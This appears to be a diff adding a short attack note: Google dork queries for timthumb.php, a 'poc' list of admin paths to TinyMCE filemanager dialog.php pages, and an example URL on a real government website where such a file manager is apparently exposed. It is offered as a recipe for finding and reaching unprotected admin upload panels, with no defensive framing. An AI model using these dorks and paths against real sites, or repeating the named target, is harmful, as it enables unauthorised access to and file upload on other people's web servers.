@@ -1,0 +1,14 @@
+dork
+inurl:/admin/js_admin/timthumb/timthumb.php?src=
+inurl:/admin/js/timthumb/timthumb.php?src=
+
+poc :
+site.com/admin/js_admin/tinymce/plugins/filemanager/dialog.php
+site.com/admin/js_admin/tiny_mce/plugins/filemanager/dialog.php
+site.com/admin/js/tinymce/plugins/filemanager/dialog.php
+site.com/admin/js/tiny_mce/plugins/filemanager/dialog.php
+site.com/admin/js_admin/filemanager/dialog.php
+site.com/admin/js/filemanager/dialog.php
+
+example:
+http://www.npc.gov.np/admin/js/filemanager/dialog.php
